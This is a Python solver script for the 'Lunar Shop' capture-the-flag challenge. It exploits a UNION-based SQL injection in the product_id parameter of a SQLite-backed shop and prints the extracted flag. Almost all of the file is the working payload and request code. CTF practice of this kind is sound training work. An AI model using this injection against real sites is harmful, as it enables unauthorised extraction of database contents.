#!/usr/bin/env python3
"""
Lunar Shop solver: error-based / UNION SQL injection in the integer
`product_id` parameter of /product (SQLite backend). Use a non-existent
product id (69) so the real rows don't interfere, then UNION SELECT the flag
column out of the `flag` table into injectable column 2.

Usage: python3 solve.py [base_url]
  base_url default http://127.0.0.1:25306 (archive localhost port)
  live: https://lunarshop.ctf.hackucf.org
"""
import os, sys, re, requests

base = os.environ.get("URL") or (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:25306")
payload = "69 UNION SELECT 1, flag, 3, 4 FROM flag-- -"
r = requests.get(base + "/product", params={"product_id": payload})
m = re.search(r"sun\{[^}]*\}", r.text)
print(m.group(0) if m else "NO FLAG FOUND")
